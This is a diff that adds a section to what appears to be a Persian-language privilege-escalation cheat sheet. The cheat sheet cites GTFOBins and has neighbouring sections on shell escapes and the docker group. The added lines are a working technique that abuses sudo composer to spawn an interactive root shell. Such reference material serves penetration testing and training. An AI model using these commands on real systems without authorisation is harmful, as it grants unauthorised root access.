@@ -293,6 +293,14 @@ exec "/bin/sh"
 
 راهنما: https://gtfobins.github.io/
 
+### افزایش دسترسی با composer
+
+```text
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+```
+
 ### افزایش دسترسی با docker
 
 باید با کاربردی که عضو گروه docker است وارد شده باشید.
